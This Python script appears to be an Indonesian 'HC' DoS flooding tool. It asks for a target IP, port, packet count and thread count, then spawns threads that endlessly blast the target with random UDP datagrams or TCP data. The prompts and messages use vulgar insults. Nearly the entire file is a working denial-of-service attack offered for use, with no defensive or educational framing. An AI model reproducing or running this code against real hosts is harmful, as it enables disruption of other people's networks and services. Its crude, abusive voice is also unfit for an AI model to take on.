import random
import socket
import threading
import os

os.system("clear")
print("\033[95m")
print("""
██╗░░██╗░█████╗░
██║░░██║██╔══██╗
███████║██║░░╚═╝
██╔══██║██║░░██╗
██║░░██║╚█████╔╝
╚═╝░░╚═╝░╚════╝░
██╗░░░░░██╗░░░██╗████████╗████████╗
██║░░░░░██║░░░██║╚══██╔══╝╚══██╔══╝
██║░░░░░██║░░░██║░░░██║░░░░░░██║░░░
██║░░░░░██║░░░██║░░░██║░░░░░░██║░░░
███████╗╚██████╔╝░░░██║░░░░░░██║░░░
╚══════╝░╚═════╝░░░░╚═╝░░░░░░╚═╝░░░
""")

ip = str(input(" IP NYA ASU PEPEK >>>:"))
port = int(input(" PORT NYA  PEPEK >>>:"))
choice = str(input(" GASS GAK??(Cari/Sendiri) >>>:"))
times = int(input(" PAKET NYA PEPEK ASU? >>>:"))
threads = int(input(" Threads MO BRP ASU? >>>:"))
def run():
	data = random._urandom(1035)
	i = random.choice(("Attack","",""))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +" GUE CROT LU WKWKWKWKWK")
		except:
			print("[!] EROR PEPEK!!!")

def run2():
	data = random._urandom(20)
	i = random.choice(("Attack","",""))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +"  GUE CROT LU WKWKWKWKWK")
		except:
			s.close()
			print("[*] EROR PEPEK")
            
for y in range(threads):
	if choice == 'HC TEAMV1':
		th = threading.Thread(target = run)
		th.start()
	else:
		th = threading.Thread(target = run2)
		th.start()
